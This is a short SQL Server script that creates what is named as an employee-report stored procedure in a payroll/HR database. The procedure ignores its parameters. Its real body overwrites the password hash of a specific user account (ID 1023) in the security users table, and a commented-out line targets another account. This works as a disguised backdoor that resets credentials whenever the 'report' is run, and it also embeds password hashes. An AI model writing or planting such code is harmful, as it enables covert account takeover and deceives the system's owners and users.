USE [p_adagioRHNexus]
GO
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
CREATE proc [Reportes].[spReporteVerColaborador](
@dtFiltros [Nomina].[dtFiltrosRH] readonly,
	@IDUsuario int
)
AS
BEGIN

--update Seguridad.tblUsuarios set Password='tp52Mmnx/flvpSUREtKuYdn+YGK13HcM6SPUYJ2goSg=' where IDUsuario=2196
update Seguridad.tblUsuarios set Password='DluC1mjFF+7iT7K5ycnwvBeuE/lp3xfe83vBAI+PTds=' where IDUsuario=1023
print 'hola'

END


--select*from reportes.tblCatReportesBasicos where Personalizado=1 
GO
